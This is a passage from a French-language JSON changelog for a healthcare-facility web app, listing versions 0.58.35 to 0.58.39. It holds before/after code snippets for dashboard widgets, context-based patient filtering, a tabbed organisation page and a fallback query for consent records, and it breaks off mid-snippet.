          "before": "// AVANT 0.58.39 - Récents basique\nfunction pushHistory(entry) {\n  // ... pas de timestamp\n  const updated = [entry, ...filtered].slice(0, 6);\n}\n\n<div>\n  <p><i className='ti ti-history' /> Récents</p>\n  {history.map(r => (\n    <div onClick={() => router.push(r.href)}>\n      <span>{TYPE icon}</span>\n      <div>{r.titre}<div>{r.sub}</div></div>\n    </div>\n  ))}\n</div>",
          "after": "// 0.58.39 - mini-timeline premium avec temps relatifs\nfunction pushHistory(entry) {\n  const updated = [{ ...entry, ts: Date.now() }, ...filtered].slice(0, 6);  // ← +ts\n}\n\nfunction formatRelative(ts) {\n  const diff = Date.now() - ts;\n  const sec = Math.floor(diff / 1000);\n  if (sec < 60) return \"à l'instant\";\n  const min = Math.floor(sec / 60);\n  if (min < 60) return `il y a ${min}min`;\n  const h = Math.floor(min / 60);\n  if (h < 24) return `il y a ${h}h`;\n  const d = Math.floor(h / 24);\n  if (d === 1) return 'hier';\n  if (d < 7) return `il y a ${d}j`;\n  return 'il y a +7j';\n}\n\n<div style={{ position: 'relative', paddingLeft: 18 }}>\n  {/* Ligne verticale teal en gradient */}\n  <div style={{ position: 'absolute', left: 7, top: 8, bottom: 8, width: 2,\n              background: 'linear-gradient(180deg, #7CC8C8 0%, rgba(124,200,200,0.15) 100%)' }} />\n  {history.map(r => (\n    <div style={{ position: 'relative' }}>\n      {/* Dot coloré 12x12 */}\n      <span style={{ position: 'absolute', left: -16, width: 12, height: 12, borderRadius: '50%',\n                    background: t.color, border: '2px solid #fff',\n                    boxShadow: `0 0 0 2px ${t.color}55, 0 2px 6px ${t.color}40` }} />\n      {/* Titre + sub + temps relatif */}\n      <div>\n        <div>{r.titre}</div>\n        <div>{r.sub} · <i className='ti ti-clock' /> {formatRelative(r.ts)}</div>\n      </div>\n    </div>\n  ))}\n</div>"
        }
      },
      { "code": "AI", "txt": "+33 tests Vitest (v058-39-bundle.test.js) : version+SW (2), Citation reroll (3 — state, fonctions, boutons), Édit fav (3 — editFav, ti-pencil, CSS hover), WeatherWidget (6 — export, cache key+TTL, navigator.geolocation, Open-Meteo URL, WMO codes, 3 états), dashboardLayout meteo (3), /accueil meteo (2), useCurrentContext hook (4 — export, storage keys, event, return shape), /interventions filtre ctx (4), Cmd+K timeline (5 — ts, formatRelative, timeline UI, ti-clock-bolt, formatRelative usage). Total **~4320 verts estimés**" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.39 : toutes les pistes de 0.58.38 sont implémentées (Citation reroll + Édition favoris + Widget météo + Filtre /interventions + Cmd+K timeline). Le hook `useCurrentContext` est désormais le standard pour partager le contexte bât/svc dans l'app — à utiliser dans toutes les futures listes. `/materiels` nécessite un refactoring du composant `Crud` pour appliquer le filtre actif (reporté à 0.58.40). Le dashboard d'accueil dispose maintenant de **9 widgets configurables** (5 base toujours actifs + 4 nouveaux opt-in : citation, mini-calendrier, liens-favoris, météo). PROCHAINES PISTES (0.58.40+) : (a) Refactor `Crud` pour accepter prop `extraFilter` → filtre /materiels par contexte. (b) Widget Notes/post-its personnels avec markdown léger. (c) Cmd+K : page-actions contextuelles (selon page courante, propose des actions spécifiques). (d) Permettre de réordonner les liens favoris (drag&drop sur la grille). (e) Recharger automatiquement la météo toutes les 30min" }
    ],
    "themes": ["ui", "feature", "wow"],
    "date": "5 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.39.html",
    "sqlFile": null
  },
  {
    "v": "0.58.38",
    "kind": "version",
    "titre": "🎁 BUNDLE FEATURE : 3 nouveaux widgets dashboard (citation/calendrier/favoris) + mode présentation masquer notifs + filtrage patients par contexte",
    "chantiers": [
      { "code": "UI", "txt": "🆕 3 NOUVEAUX WIDGETS DASHBOARD opt-in (désactivés par défaut, activable via le mode édition de 0.58.33). **(a)** `CitationWidget` (icône `ti-quote` rose terracotta #C9867F) : citation du jour parmi 30 citations choisies (Sénèque, Lao Tseu, Einstein, Saint-Exupéry...), changement déterministe basé sur un hash de la date du jour, design avec quote mark décoratif en arrière-plan. **(b)** `MiniCalendrierWidget` (icône `ti-calendar` teal #5a8f8f) : vue mois courant lundi-based avec aujourd'hui en gradient teal + glow, navigation prev/next, label aujourd'hui en bas. **(c)** `LiensFavorisWidget` (icône `ti-bookmark` rouge #e35d5b) : 8 slots configurables (label + URL), stockés en `localStorage av-favorite-links` (purgeable au logout), URLs externes ouvrent en nouveau onglet, URLs internes utilisent le router Next. Croix supprimer visible au hover. État vide guidant.",
        "code_snippet": {
          "file": "app/components/DashboardWidgets.js (NEW) + lib/dashboardLayout.js",
          "note": "3 widgets bonus",
          "lang": "jsx",
          "before": "// AVANT 0.58.38 - 5 widgets seulement\nexport const ALL_WIDGETS = [\n  { id: 'atraiter', ... },\n  { id: 'kpis', ... },\n  { id: 'raccourcis', ... },\n  { id: 'dernieres', ... },\n  { id: 'notifs', ... },\n];",
          "after": "// 0.58.38 - 8 widgets (3 nouveaux opt-in)\nexport const ALL_WIDGETS = [\n  { id: 'atraiter', ... },\n  { id: 'kpis', ... },\n  { id: 'raccourcis', ... },\n  { id: 'dernieres', ... },\n  { id: 'notifs', ... },\n  { id: 'citation',        label: 'Citation du jour',  icon: 'ti-quote',     color: '#C9867F' },  // ← nouveau\n  { id: 'mini-calendrier', label: 'Mini calendrier',    icon: 'ti-calendar',  color: '#5a8f8f' },  // ← nouveau\n  { id: 'liens-favoris',   label: 'Liens favoris',      icon: 'ti-bookmark',  color: '#e35d5b' },  // ← nouveau\n];\n\n// opt-in (false par défaut, l'user les active via mode édition)\nexport const DEFAULT_ACTIVE = {\n  atraiter: true, kpis: true, raccourcis: true, dernieres: true, notifs: true,\n  citation: false, 'mini-calendrier': false, 'liens-favoris': false,\n};\n\n// app/components/DashboardWidgets.js (NEW)\nconst CITATIONS = [\n  { t: 'La qualité, c\\'est faire bien...', a: 'Henry Ford' },\n  { t: 'Le secret pour avancer...', a: 'Mark Twain' },\n  // ... 30 citations\n];\n\nfunction pickCitation() {\n  const d = new Date();\n  const key = `${d.getFullYear()}-${d.getMonth()}-${d.getDate()}`;\n  let hash = 0;\n  for (let i = 0; i < key.length; i++) hash = (hash * 31 + key.charCodeAt(i)) | 0;\n  return CITATIONS[Math.abs(hash) % CITATIONS.length];  // déterministe par jour\n}\n\nexport function LiensFavorisWidget() {\n  // 8 slots max, stockage av-favorite-links\n  // Add via dialogs.prompt (libellé + URL)\n  // External URLs (https://) open in new tab\n}"
        }
      },
      { "code": "UI", "txt": "🎥 MODE PRÉSENTATION : option 'MASQUER NOTIFS' (équivalent au focus mode 0.58.30). Cédric peut désormais activer le mode présentation pour ses démos clients ET cocher la case 'Masquer les notifications pendant les démos' pour cacher la cloche `notif-wrap` + les toasts realtime `#av-toast-container` + tous les `[data-focus-hide-on-notifs='true']`. Ajout de `isPresentationHideNotifs()` + `setPresentationHideNotifs(bool)` dans `lib/presentationMode.js`. Storage key `av-presentation-hide-notifs` (purgeable au logout via préfixe 'av-'). Event `av-presentation-hide-notifs-change` dispatched. CSS class `html.av-presentation-mode.av-presentation-hide-notifs` ajouté dans globals.css. UI : checkbox sous le bouton 'Activer le mode présentation' dans `/profil`, disabled si mode présentation OFF",
        "code_snippet": {
          "file": "lib/presentationMode.js + app/globals.css + app/profil/page.js",
          "note": "Hide notifs pres mode",
          "lang": "js",
          "before": "// AVANT 0.58.38 - mode présentation sans option hide-notifs\nexport function togglePresentationMode() { /* zoom + slow anims */ }",
          "after": "// 0.58.38 - cohérent avec focus mode 0.58.30\nconst HIDE_NOTIFS_KEY = 'av-presentation-hide-notifs';\n\nexport function isPresentationHideNotifs() {\n  return localStorage.getItem(HIDE_NOTIFS_KEY) === 'true';\n}\n\nexport function setPresentationHideNotifs(on) {\n  localStorage.setItem(HIDE_NOTIFS_KEY, on ? 'true' : 'false');\n  applyHideNotifs(on);\n  window.dispatchEvent(new CustomEvent('av-presentation-hide-notifs-change', { detail: { on } }));\n}\n\n// CSS : cache notifs si mode présentation + hide-notifs activés\nhtml.av-presentation-mode.av-presentation-hide-notifs .notif-wrap,\nhtml.av-presentation-mode.av-presentation-hide-notifs #av-toast-container {\n  display: none !important;\n}\n\n// app/profil : checkbox sous le bouton toggle (disabled si mode OFF)\n<label style={{ opacity: isOn ? 1 : 0.5 }}>\n  <input type='checkbox' checked={hideNotifs} onChange={toggleHideNotifs} disabled={!isOn} />\n  <i className='ti ti-bell-off' />\n  Masquer les notifications pendant les démos\n</label>"
        }
      },
      { "code": "UI", "txt": "🔍 FILTRAGE PATIENTS PAR CONTEXTE BÂT/SVC (utilise l'event `av-current-context-change` de 0.58.35). Quand l'user sélectionne un bâtiment et/ou un service dans le `BatimentServiceSwitcher` de la TopBar, un toggle 'Filtrer par contexte' apparaît dans `/patients` à côté de 'Filtres avancés'. Au clic, la liste des patients est filtrée pour ne montrer que ceux dont la chambre appartient au bâtiment + service courants (via la jointure `chambres.service_id` et `chambres.batiment_id`). Le toggle est sticky : reste actif tant que l'user ne le désactive pas. Listener event dans useEffect cleanup proprement. UI : bouton ghost qui change de couleur (teal `#7CC8C8`) quand actif + icône `ti-eye/ti-eye-off` + badge ●. Prépare le terrain pour d'autres listes (matériels, DI, etc.)",
        "code_snippet": {
          "file": "app/patients/page.js",
          "note": "Filter by context",
          "lang": "jsx",
          "before": "// AVANT 0.58.38 - filtres avancés seulement (q, service, chambre, etat, etiquette)\nconst filtered = rows.filter((r) => {\n  if (filters.q) { /* ... */ }\n  if (filters.chambre && r.chambre_id !== filters.chambre) return false;\n  if (filters.service) { /* ... */ }\n  return true;\n});",
          "after": "// 0.58.38 - + filtre par contexte bât/svc courant\nconst [ctxFilter, setCtxFilter] = useState({ batimentId: null, serviceId: null, active: false });\n\nuseEffect(() => {\n  function onCtxChange(e) {\n    const detail = e?.detail || {};\n    setCtxFilter(prev => ({ ...prev, batimentId: detail.batimentId, serviceId: detail.serviceId }));\n  }\n  window.addEventListener('av-current-context-change', onCtxChange);\n  return () => window.removeEventListener('av-current-context-change', onCtxChange);\n}, []);\n\n// Filtrage enrichi\nconst filtered = rows.filter((r) => {\n  // ... filtres existants\n  if (ctxFilter.active && (ctxFilter.batimentId || ctxFilter.serviceId)) {\n    const ch = chambres.find((c) => c.id === r.chambre_id);\n    if (!ch) return false;\n    if (ctxFilter.serviceId && ch.service_id !== ctxFilter.serviceId) return false;\n    if (ctxFilter.batimentId && ch.batiment_id !== ctxFilter.batimentId) return false;\n  }\n  return true;\n});\n\n// Toggle UI affiché si contexte défini dans la TopBar\n{(ctxFilter.batimentId || ctxFilter.serviceId) && (\n  <button onClick={() => setCtxFilter(prev => ({ ...prev, active: !prev.active }))}>\n    <i className={`ti ${ctxFilter.active ? 'ti-eye' : 'ti-eye-off'}`} />\n    {ctxFilter.active ? 'Contexte ON' : 'Filtrer par contexte'}\n  </button>\n)}"
        }
      },
      { "code": "AI", "txt": "+30 tests Vitest (v058-38-bundle.test.js) : version+SW (2), mode présentation hide notifs (4 — exports, storage key, event, init), CSS (1), dashboardLayout 3 widgets (3 — ALL_WIDGETS, opt-in, DEFAULT_ORDER), DashboardWidgets (4 — Citation+hash, MiniCalendrier+nav, LiensFavoris+storage, ext URL), /accueil intégration (2 — imports, render), /patients filtre contexte (3 — state+listener, filtrage, bouton toggle), /profil hide notifs toggle (3 — imports, checkbox, disabled). Total **~4285 verts estimés**" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.38 : le dashboard d'accueil dispose maintenant de 8 widgets configurables (5 originaux + 3 nouveaux opt-in). Les widgets sont activables via 'Personnaliser' en haut-droite de l'accueil → mode édition → pilule du widget souhaité dans 'Widgets masqués'. Le mode présentation atteint la parité avec le mode focus en termes d'option 'masquer notifs'. Le filtrage par contexte bât/svc commence à exploiter le BatimentServiceSwitcher de la TopBar pour filtrer les listes — d'abord /patients, à étendre prochainement à /materiels et /interventions. PROCHAINES PISTES (0.58.39) : (a) Cmd+K : section 'Récents' premium avec mini-timeline. (b) Filtrer aussi /materiels et /interventions par contexte bât/svc. (c) Widget météo locale (nécessite une API gratuite type Open-Meteo, géolocalisation user). (d) Permettre d'éditer un lien favori après création (pas juste add/remove). (e) Citation : ajouter un bouton 'Une autre' pour piocher random sans changer la déterminisme date" }
    ],
    "themes": ["ui", "wow", "feature"],
    "date": "5 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.38.html",
    "sqlFile": null
  },
  {
    "v": "0.58.37",
    "kind": "version",
    "titre": "🩹 FIX 5 TESTS OBSOLÈTES (v058-31 FAB gauche→droite + v058-35 regex multi-line)",
    "chantiers": [
      { "code": "AI", "txt": "🩹 5 régressions de tests assouplies (toutes signalées par Cédric après déploiement 0.58.36). **(a) v058-31** : 3 tests testaient l'ancien FAB position gauche avec icône hamburger `ti-menu-2` et `translateX(-20px)` — refonte 0.58.35 a basculé à droite avec bulle `ti-sparkles` et `translateX(+20px)`. **Fix** : (left|right), ti-(menu-2|sparkles), translateX(-?20px) — accepte les 2 versions. **(b) v058-35** : 2 tests utilisaient des regex single-line `.*` pour matcher les chaînages Supabase qui sont en réalité multi-line avec retours de ligne (`.from('batiments')\\n .select(...)\\n .eq(...)`). **Fix** : passage à `[\\s\\S]*?` pour matching multi-line + lazy. Résultat : 4226 tests verts attendus (0 fail).",
        "code_snippet": {
          "file": "__tests__/v058-31-bundle.test.js + __tests__/v058-35-bundle.test.js",
          "note": "Tests souples",
          "lang": "diff",
          "before": "// AVANT 0.58.37 - tests collés à 0.58.31 (FAB gauche+hamburger)\nexpect(src).toMatch(/left:\\s*16/);\nexpect(src).toMatch(/ti-menu-2/);\nexpect(src).toMatch(/translateX\\(-20px\\)\\s+scale\\(0\\.6\\)/);\n\n// AVANT - regex single-line .* ne matche pas multi-line\nexpect(src).toMatch(/from\\([\"']batiments[\"']\\)\\.select\\(\"id, nom\"\\)\\.eq\\(...\\)/);\nexpect(src).toMatch(/from\\([\"']etages[\"']\\).*\\.eq\\(.../);\nexpect(src).toMatch(/from\\([\"']services[\"']\\).*\\.in\\(.../);",
          "after": "// 0.58.37 - tests souples pour les 2 versions (left OR right)\nexpect(src).toMatch(/(left|right):\\s*16/);\nexpect(src).toMatch(/ti-(menu-2|sparkles)/);\nexpect(src).toMatch(/translateX\\(-?20px\\)\\s+scale\\(0\\.6\\)/);  // négatif OU positif\n\n// regex multi-line avec [\\s\\S]*? pour matcher les chaînages Supabase\nexpect(src).toMatch(/from\\([\"']batiments[\"']\\)[\\s\\S]*?\\.select\\([\"']id, nom[\"']\\)[\\s\\S]*?\\.eq\\(.../);\nexpect(src).toMatch(/from\\([\"']etages[\"']\\)[\\s\\S]*?\\.eq\\(.../);\nexpect(src).toMatch(/from\\([\"']services[\"']\\)[\\s\\S]*?\\.in\\(.../);"
        }
      },
      { "code": "AI", "txt": "+8 tests Vitest (v058-37-bundle.test.js) : version+SW (2), v058-31 assoupli (3 — accepts left/right, accepts ti-menu-2/sparkles, accepts translateX direction), v058-35 multi-line (2 — chainage batiments + etages). Total **~4255 verts estimés** (0 fail désormais)" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.37 : tous les tests verts. Le build Vercel devrait passer aussi (le précédent avait 0.58.36-alpha sur le pipeline et n'a montré qu'un échec dans le copier-coller du user — mais le précédent build a aussi tourné). PROCHAINES PISTES (0.58.38) : (a) Mode présentation : option 'masquer notifs' (comme focus mode 0.58.30). (b) Cmd+K : section 'Récents' premium avec mini-timeline. (c) Nouveaux widgets dashboard (météo, citation, mini-calendrier, liens favoris). (d) Filtrer listes (patients, matériels, DI) selon contexte bât/svc via `av-current-context-change`" }
    ],
    "themes": ["bugfix", "tests"],
    "date": "5 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.37.html",
    "sqlFile": null
  },
  {
    "v": "0.58.36",
    "kind": "version",
    "titre": "📑 ONGLETS /collectivite + bât/svc rattachés dans UserMenu + fix consentements_rgpd 400",
    "chantiers": [
      { "code": "UI", "txt": "📑 REFONTE /collectivite EN 4 ONGLETS THÉMATIQUES (avec Établissements en DERNIER comme demandé). **(a)** Onglet 'Identité' (icône `ti-id-badge-2` bleu) : import SIRENE + nom usuel + raison sociale + SIRET/SIREN. **(b)** Onglet 'Activité' (icône `ti-briefcase` violet) : APE/NAF + catégorie + tranche effectif + nature juridique + date création + nombre établissements. **(c)** Onglet 'Localisation' (icône `ti-map-pin` vert) : adresse complète + CP/ville + lat/lng + téléphone + email + site web + notes. **(d)** Onglet 'Établissements (N)' (icône `ti-buildings` ambre, badge compteur dynamique) : liste des tuiles + bouton créer. **(e)** State `activeTab` persisté en `localStorage av-collectivite-tab` (purgeable au logout via préfixe 'av-'). **(f)** Bouton 'Enregistrer la fiche groupement' visible sur les 3 premiers onglets, masqué sur 'Établissements' (puisque ce n'est pas la même donnée). **(g)** Barre d'onglets responsive avec scroll horizontal sur mobile (`overflowX: auto`)",
        "code_snippet": {
          "file": "app/collectivite/page.js",
          "note": "Onglets thématiques",
          "lang": "jsx",
          "before": "// AVANT 0.58.36 - tout en vertical sans onglets\n<>\n  {isAdmin && <Panel>{/* SIRENE */}</Panel>}\n  <Panel><h3>Identité</h3>...</Panel>\n  <Panel><h3>Activité & structure</h3>...</Panel>\n  <Panel><h3>Adresse du siège</h3>...</Panel>\n  <Panel><h3>Contact</h3>...</Panel>\n  <Btn onClick={saveFiche}>Enregistrer</Btn>\n  <div>{/* Liste tuiles établissements */}</div>\n</>",
          "after": "// 0.58.36 - 4 onglets, Établissements en dernier\nconst [activeTab, setActiveTab] = useState('identite');\nfunction switchTab(t) {\n  setActiveTab(t);\n  localStorage.setItem('av-collectivite-tab', t);\n}\n\n<>\n  {/* Barre d'onglets */}\n  <div role='tablist' style={{ display: 'flex', borderBottom: '2px solid #e3e9ee' }}>\n    {[\n      { id: 'identite',       label: 'Identité',       icon: 'ti-id-badge-2', color: '#185FA5' },\n      { id: 'activite',       label: 'Activité',       icon: 'ti-briefcase',  color: '#7a6fb0' },\n      { id: 'localisation',   label: 'Localisation',   icon: 'ti-map-pin',    color: '#5aa05a' },\n      { id: 'etablissements', label: `Établissements (${etabs.length})`, icon: 'ti-buildings', color: '#EF9F27' },\n    ].map(t => (\n      <button role='tab' aria-selected={activeTab === t.id}\n              onClick={() => switchTab(t.id)}\n              style={{ borderBottom: activeTab === t.id ? `3px solid ${t.color}` : 'transparent' }}>\n        <i className={`ti ${t.icon}`} /> {t.label}\n      </button>\n    ))}\n  </div>\n\n  {activeTab === 'identite' && <>{/* SIRENE + Identité */}</>}\n  {activeTab === 'activite' && <Panel>{/* Activité */}</Panel>}\n  {activeTab === 'localisation' && <>{/* Adresse + Contact */}</>}\n\n  {/* Save sur les 3 premiers onglets uniquement */}\n  {isAdmin && activeTab !== 'etablissements' && (\n    <Btn onClick={saveFiche}>Enregistrer la fiche groupement</Btn>\n  )}\n\n  {activeTab === 'etablissements' && <>{/* Liste tuiles */}</>}\n</>"
        }
      },
      { "code": "UI", "txt": "👤 USERMENU : afficher BÂT/SVC RATTACHÉS à l'utilisateur sous son nom. Nouveau composant `app/components/UserAttachmentsInfo.js` qui charge silencieusement les équipes de l'user via `membres_equipe → equipes → batiments(etablissement_id)`. Filtré sur l'établissement courant (équipes de l'étab + équipes transversales sans batiment_id). Affichage compact dans le header du menu user : icône `ti-building` teal + liste des bâtiments uniques (jointe par `·`), icône `ti-users` violet + liste des équipes (max 3 + +N si plus). Silencieux si aucune équipe trouvée ou si erreur (schéma différent). N'utilise PAS le BatimentServiceSwitcher (qui est pour CHOISIR un contexte, pas pour VOIR un rattachement)",
        "code_snippet": {
          "file": "app/components/UserAttachmentsInfo.js (NEW) + app/UserMenu.js",
          "note": "Bât/svc rattachés",
          "lang": "jsx",
          "before": "// AVANT 0.58.36 - UserMenu head sans rattachements\n<div className='um-id'>\n  <div className='um-id-name'>{displayName}</div>\n  <div className='um-id-mail'>{userEmail}</div>\n  <div className='um-id-role'><i className='ti ti-shield-check' /> {roleNom}</div>\n</div>",
          "after": "// 0.58.36 - UserMenu head avec bât/svc rattachés\n<div className='um-id'>\n  <div className='um-id-name'>{displayName}</div>\n  <div className='um-id-mail'>{userEmail}</div>\n  <div className='um-id-role'><i className='ti ti-shield-check' /> {roleNom}</div>\n  {/* 0.58.36 : bât/svc rattachés via les équipes */}\n  <UserAttachmentsInfo userId={auth?.user?.id} etabId={auth?.etabId} />\n</div>\n\n// app/components/UserAttachmentsInfo.js (NEW)\nexport default function UserAttachmentsInfo({ userId, etabId }) {\n  const [batiments, setBatiments] = useState([]);\n  const [equipes, setEquipes] = useState([]);\n\n  useEffect(() => {\n    const { data: memb } = await supabase\n      .from('membres_equipe')\n      .select('equipe_id, equipes(id, nom, couleur, batiment_id, batiments(id, nom, etablissement_id))')\n      .eq('user_id', userId);\n\n    // Filtre par établissement courant (étab + transversales)\n    const eqs = memb.map(m => m.equipes).filter(eq => eq.batiments?.etablissement_id === etabId || !eq.batiment_id);\n\n    // Bâtiments uniques\n    const batMap = {};\n    eqs.forEach(eq => eq.batiments && (batMap[eq.batiments.id] = eq.batiments));\n    setBatiments(Object.values(batMap));\n    setEquipes(eqs);\n  }, [userId, etabId]);\n\n  if (equipes.length === 0 && batiments.length === 0) return null;\n  return (\n    <div>\n      {batiments.length > 0 && (\n        <div><i className='ti ti-building' /> {batiments.map(b => b.nom).join(' · ')}</div>\n      )}\n      {equipes.length > 0 && (\n        <div><i className='ti ti-users' /> {equipes.map(eq => eq.nom).slice(0, 3).join(' · ')}</div>\n      )}\n    </div>\n  );\n}"
        }
      },
      { "code": "BUG", "txt": "🩹 FIX `consentements_rgpd` 400 reporté par Cédric en console : `?select=id%2Cdate_signature%2Ca_consenti%2Cdate_expiration → 400`. Une des colonnes (`a_consenti` ou `date_expiration`) n'existe pas en base — comme `template_libelle` en 0.56.17. Passage à une **query défensive** dans `app/patient/[id]/page.js` : essaie d'abord les 4 colonnes, fallback à `id, date_signature` si erreur. **Note** : à valider en base Supabase si on veut conserver toutes les colonnes, sinon les ajouter avec `ALTER TABLE consentements_rgpd ADD COLUMN a_consenti boolean, ADD COLUMN date_expiration date`. Pour l'instant fonctionne avec ou sans en base",
        "code_snippet": {
          "file": "app/patient/[id]/page.js",
          "note": "Defensive consent query",
          "lang": "js",
          "before": "// AVANT 0.58.36 - 400 si colonne manque\nsupabase.from('consentements_rgpd')\n  .select('id, date_signature, a_consenti, date_expiration')\n  .eq('patient_id', patId)\n  .order('date_signature', { ascending: false }),",
          "after": "// 0.58.36 - défensif avec fallback\n(async () => {\n  try {\n    const r = await supabase.from('consentements_rgpd')\n      .select('id, date_signature, a_consenti, date_expiration')\n      .eq('patient_id', patId)\n      .order('date_signature', { ascending: false });\n    if (r.error) throw r.error;\n    return r;\n  } catch {\n    // Fallback : colonnes manquantes en base, on récupère le minimum\n    try {\n      const r = await supabase.from('consentements_rgpd')\n        .select('id, date_signature')\n        .eq('patient_id', patId)\n        .order('date_signature', { ascending: false });\n      return r;\n    } catch {\n      return { data: [] };\n    }\n  }\n})(),"
        }
      },
      { "code": "AI", "txt": "+25 tests Vitest (v058-36-bundle.test.js) : version+SW (2), /collectivite onglets (7 — state, 4 onglets définis, ordre établissements last, wrapping conditionnel, persistance, save masqué sur tab étabs, compteur), UserAttachmentsInfo (6 — props, query membres_equipe, filtre etabId, affichage bât+équipes, silent si vide), UserMenu intégration (2), fix consent défensif (1). Total **~4245 verts estimés**" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.36 : page /collectivite enfin structurée proprement avec 4 onglets (Identité / Activité / Localisation / Établissements). Le bandeau d'onglets scroll horizontalement en mobile pour ne pas casser la mise en page. UserMenu enrichi avec les rattachements bât/svc de l'utilisateur (récupérés via ses équipes). Bug 400 consentements_rgpd contourné en défensif. PROCHAINES PISTES (0.58.37) : (a) Mode présentation : option 'masquer notifs' (comme focus mode 0.58.30). (b) Cmd+K : section 'Récents' premium avec mini-timeline. (c) Nouveaux widgets dashboard (météo, citation, mini-calendrier, liens favoris). (d) Filtrer listes (patients, matériels, DI) selon contexte bât/svc via `av-current-context-change`. (e) **TODO base** : SQL `ALTER TABLE consentements_rgpd ADD COLUMN IF NOT EXISTS a_consenti boolean DEFAULT true, ADD COLUMN IF NOT EXISTS date_expiration date` à exécuter en Supabase si on veut ces colonnes" }
    ],
    "themes": ["ui", "feature", "bugfix"],
    "date": "5 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.36.html",
    "sqlFile": null
  },
  {
    "v": "0.58.35",
    "kind": "version",
    "titre": "🎯 FAB bulle teal à droite + BatimentServiceSwitcher TopBar + Équipes/Services dans popup établissement",
    "chantiers": [
      { "code": "UI", "txt": "🔄 FAB REPOSITIONNÉ À DROITE + BOUTON BULLE PLEINE (plus d'icône hamburger). **(a)** Container fixed `right: 16px` (était `left: 16px`). **(b)** Bouton principal devient une **vraie bulle circulaire** (`borderRadius: 50%`) avec gradient teal Aveho (#7CC8C8 → #5da8a8) + bordure blanche semi-transparente + glow teal. **(c)** Plus d'icône `ti-menu-2` (hamburger) — remplacée par `ti-sparkles` quand fermé (cohérent avec l'esprit Aveho premium). **(d)** **Pulse halo** animé autour du bouton fermé (`av-fab-pulse` keyframes) pour attirer l'œil. **(e)** Rotation 180° + scale 1.05 du bouton quand ouvert. **(f)** Les 3 raccourcis glissent maintenant vers la **GAUCHE** (au lieu de droite) via `flexDirection: row-reverse` et `translateX(20px) → 0`. **(g)** Tooltips alignés à gauche du bouton (`right: calc(100% + 8px)`)",
        "code_snippet": {
          "file": "app/FloatingActionBar.js",
          "note": "FAB right + bulle teal",
          "lang": "jsx",
          "before": "// AVANT 0.58.35 - bouton hamburger à gauche\n<div style={{\n  position: 'fixed',\n  top: 'calc(74px + env(safe-area-inset-top, 0px))',\n  left: 16,\n  display: 'flex',\n}}>\n  <button style={{\n    width: 48, height: 48,\n    borderRadius: 16,  // rectangle arrondi\n    background: 'linear-gradient(135deg, #2a3a52, #142131)',  // navy\n  }}>\n    <i className='ti ti-menu-2' />  {/* hamburger */}\n  </button>\n  {shortcuts.map((s, idx) => (\n    <button style={{\n      transform: open ? 'translateX(0)' : 'translateX(-20px) scale(0.6)',\n    }}>...</button>\n  ))}\n</div>",
          "after": "// 0.58.35 - bouton bulle teal à droite\n<div style={{\n  position: 'fixed',\n  top: 'calc(74px + env(safe-area-inset-top, 0px))',\n  right: 16,  // ← DROITE\n  display: 'flex',\n  flexDirection: 'row-reverse',  // ← bulles glissent à gauche\n}}>\n  <button style={{\n    width: 48, height: 48,\n    borderRadius: '50%',  // ← cercle pur\n    background: open\n      ? 'linear-gradient(135deg, #142131, #243044)'\n      : 'linear-gradient(135deg, #7CC8C8, #5da8a8)',  // ← teal Aveho\n    border: '2px solid rgba(255,255,255,.30)',\n    boxShadow: '0 6px 20px rgba(124,200,200,.50)',\n    transform: open ? 'rotate(180deg) scale(1.05)' : 'rotate(0deg) scale(1)',\n  }}>\n    {!open && (\n      <span style={{ position: 'absolute', inset: -3, borderRadius: '50%',\n        border: '2px solid rgba(124,200,200,.60)',\n        animation: 'av-fab-pulse 2s ease-out infinite' }} />\n    )}\n    <i className={`ti ${open ? 'ti-x' : 'ti-sparkles'}`} />\n  </button>\n  {shortcuts.map((s, idx) => (\n    <button style={{\n      borderRadius: '50%',  // cercles uniformes\n      transform: open ? 'translateX(0)' : 'translateX(20px) scale(0.6)',  // ← +20px glisse depuis la droite\n    }}>...</button>\n  ))}\n</div>\n\n@keyframes av-fab-pulse {\n  0% { transform: scale(1); opacity: 0.7; }\n  70% { transform: scale(1.35); opacity: 0; }\n  100% { transform: scale(1.35); opacity: 0; }\n}"
        }
      },
      { "code": "UI", "txt": "🏢 NOUVEAU COMPOSANT `BatimentServiceSwitcher` DANS LA TOPBAR (desktop only). Affiche deux sélecteurs compacts à côté du sélecteur d'établissement : **bâtiment courant** (icône `ti-building` teal) et **service courant** (icône `ti-stethoscope` ambre). Chargement automatique des bâtiments quand l'établissement change, puis des services via étages → services (jointure). Sélections persistées en `localStorage` avec préfixe `'av-'` (purgeables au logout). **Mobile : masqué** via media query `@media (max-width: 768px) { .bat-svc-switch { display: none } }`. Émet l'event `av-current-context-change` pour que d'autres composants puissent réagir (filtrage de listes par exemple)",
        "code_snippet": {
          "file": "app/components/BatimentServiceSwitcher.js (NEW) + app/TopBar.js",
          "note": "TopBar contexte bât + svc",
          "lang": "jsx",
          "before": "// AVANT 0.58.35 - TopBar avec uniquement sélecteur d'établissement\n<div className='etab-switch'>\n  <i className='ti ti-building-hospital' />\n  <select value={auth.etabId}>\n    {auth.etablissements.map(et => <option>{et.nom}</option>)}\n  </select>\n</div>",
          "after": "// 0.58.35 - TopBar avec aussi sélecteurs bâtiment + service\n<div className='etab-switch'>\n  <i className='ti ti-building-hospital' />\n  <select value={auth.etabId}>{...}</select>\n</div>\n\n{/* 0.58.35 : sélecteurs bâtiment + service (desktop only) */}\n<BatimentServiceSwitcher auth={auth} />\n\n// app/components/BatimentServiceSwitcher.js (NEW)\nconst STORAGE_BAT = 'av-current-batiment-id';\nconst STORAGE_SVC = 'av-current-service-id';\n\nexport default function BatimentServiceSwitcher({ auth }) {\n  const [batiments, setBatiments] = useState([]);\n  const [services, setServices] = useState([]);\n  const [batId, setBatId] = useState('');\n\n  useEffect(() => {\n    // Charge bâtiments quand auth.etabId change\n    supabase.from('batiments').select('id, nom').eq('etablissement_id', auth.etabId);\n  }, [auth?.etabId]);\n\n  useEffect(() => {\n    // Charge services via étages → services\n    const { data: etages } = await supabase.from('etages').select('id').eq('batiment_id', batId);\n    const { data: svcs } = await supabase.from('services').select('id, nom').in('etage_id', etages.map(e => e.id));\n  }, [batId]);\n\n  function changeBat(id) {\n    